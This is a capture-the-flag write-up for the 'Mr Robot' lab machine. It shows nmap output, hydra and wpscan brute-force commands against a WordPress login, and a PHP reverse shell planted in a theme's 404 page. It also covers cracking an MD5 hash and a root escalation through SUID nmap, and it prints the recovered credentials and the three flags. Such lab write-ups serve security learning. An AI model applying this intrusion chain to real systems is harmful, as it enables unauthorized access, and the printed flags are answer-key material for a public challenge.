# Mr Robot CTF

## nmap
```sql
└─$ nmap -sC -sV -oN nmap 10.10.187.41                                                                        130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 11:04 IST
Nmap scan report for 10.10.187.41
Host is up (0.13s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.65 seconds
```

## webpage
Here the http and https webpage look same

![[Pasted image 20210519111031.png]]

on brute-forcing there is a directory `/0/` and ther its says its WordPress site.

![[Pasted image 20210519111414.png]]

/robots.txt

`User-agent: *
fsocity.dic
key-1-of-3.txt
`

![[Pasted image 20210519133055.png]]

 Flag 1 `073403c8a58a1f80d943455fb30724b9`
![[Pasted image 20210519133229.png]]


## wordpress 
http://10.10.247.140/wp-login


### brute forcing the login page

I am brute forcing it with the list we got from the robots.txts

```bash
hydra -L fsocity.dic -p pass 10.10.247.140 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username"
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-19 14:04:19
[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235/p:1), ~53640 tries per task
[DATA] attacking http-post-form://10.10.247.140:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
[80][http-post-form] host: 10.10.247.140   login: Elliot   password: pass
[STATUS] 634.00 tries/min, 634 tries in 00:01h, 857601 to do in 22:33h, 16 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

sort the list first using 
`sort fsocity.dic | uniq > fsocity-sorted.txt`

```
 wpscan --url http://10.10.247.140/ -U Elliot -P fsocity-sorted.txt -t 30   
```

![[Pasted image 20210519144750.png]]

#### Creds  Elliot:ER28-0652

### wp-admin
![[Pasted image 20210519144651.png]]

not navigate to appereance and editor and change the 404 not found code to the php reverse shell code

and after chnaging listen on port and navigate to any unkown url

![[Pasted image 20210519145420.png]]



## user
here we got a md5 hash and have to crack it to get the user robot 

![[Pasted image 20210519145506.png]]

`robot:c3fcd3d76192e4007dfb496cca67e13b`

using crack station we get the pass

robot:abcdefghijklmnopqrstuvwxyz

![[Pasted image 20210519152122.png]]

and elivating the shell and changing the user, we got the 2nd flag 

`822c73956184f694993bede3eb39f959`

![[Pasted image 20210519152344.png]]

## root

running `find / -perm -u=s -type f 2>/dev/null`

![[Pasted image 20210519152716.png]]

there is the  nmap executable 

and from here we https://gtfobins.github.io/gtfobins/nmap/ we can get shell from nmap 

![[Pasted image 20210519153119.png]]

3rd flag == `04787ddef27c3dee1ee161b21670b4e4`